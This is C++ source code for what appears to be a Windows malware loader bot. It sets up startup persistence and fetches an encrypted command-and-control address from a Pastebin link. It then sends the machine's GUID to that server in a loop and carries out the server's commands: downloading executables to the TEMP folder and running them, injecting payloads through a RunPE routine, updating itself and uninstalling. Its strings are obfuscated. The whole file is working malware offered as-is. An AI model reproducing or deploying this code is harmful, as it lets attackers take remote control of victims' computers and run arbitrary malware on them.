#include <stdio.h>
#include <iostream>
#include <fstream>
#include "HTTPRequest.hpp"
#include <windows.h>
#include <Urlmon.h> 
#include <time.h>
#include <lm.h>
#include <vector>
#include <thread>
#include <ShellAPI.h>
#include <wbemidl.h>
#include "config.h"
#include <conio.h>
#include "obfuscat.h"
#include <atlbase.h>
#include <wtypes.h>
#include <comutil.h>
#include "Helpers.hpp"
#include "OsHelpers.hpp"
#include "XOR.h"
#include "spiderrun.h"
#include "Client.h"

#pragma comment(lib,"comsuppw.lib")
#pragma comment( lib, "Urlmon.lib" )
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib,"wbemuuid")



struct ComInit
{
	HRESULT hr;
	ComInit() : hr(::CoInitialize(nullptr)) {}
	~ComInit() { if (SUCCEEDED(hr)) ::CoUninitialize(); }
};



#if _DEBUG
int main(int argc, char* argv[]) {
#endif
#if NDEBUG 
int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
#endif
		Config config;
	
		//Check if the Bot is Running
		std::string mutex = OBFUSCATE("Local\\") + config.mutex;
		CreateMutexA(0, FALSE, mutex.c_str()); // try to create a named mutex
		if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already exist?
			return -1; // quit; mutex is released automatically


		//Autostart  (with persistence) && Clone
		if (config.startup == true) {
			std::string insatlled = Helpers::installedOrnot();
			if (insatlled == OBFUSCATE("restart")) {
				return 0;
			}
			std::thread startupPersistence(Helpers::addstartup);
			startupPersistence.join();
		}


	
		//Fetch Gate from raw Site
		http::Request request(config.pastebinUrl);
		http::Response response = request.send(OBFUSCATE("GET"));
		std::string gateFromPatebin = XOR::encryptDecrypt(Helpers::responseToString(response));
	


		//Main
		std::string guid = Helpers::GetMachineGUID();
		std::string finalPost = Client::returnFinalPost();

		while (true) {
			try {

				std::string responseFromGate = Client::sendPost(gateFromPatebin, finalPost);

				if (responseFromGate.find(OBFUSCATE("dande")) != std::string::npos) {
					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
					std::string random_str = Helpers::RandomString(10);
					std::string url(v[2]);
					std::string file((std::string)getenv(OBFUSCATE("TEMP")) + "\\" + random_str + OBFUSCATE(".exe"));
					Helpers::downloadFile(url, file);
					std::string started = Helpers::startNewProcess(file);
					Client::sendPost(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0]);
				}else if (responseFromGate.find(OBFUSCATE("runpe")) != std::string::npos) {
						std::vector<std::string> v = Helpers::explode(";", responseFromGate);
						std::string url(v[2]);
						LPVOID FileData = DownloadURLToBuffer(url.c_str());
						bool runned = NTRX_RUNPE32(FileData);
						std::string started = OBFUSCATE("failed");
						if(runned){
							 started = OBFUSCATE("success");
						}
						Client::sendPost(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0]);
					}
				else {
					if (responseFromGate.find(OBFUSCATE("uninstall")) != std::string::npos) {
						Helpers::uninstall();
						return 0;
					}
					else if (responseFromGate.find(OBFUSCATE("update")) != std::string::npos) {
						std::vector<std::string> v = Helpers::explode(";", responseFromGate);
						Helpers::update(v[2]);
						return 0;
					}

				}
			}
			catch (const std::exception & e) {
				std::cerr << OBFUSCATE("Request failed, error: ") << e.what() << std::endl;
			}
			
			Sleep(10000);
		}
		
}
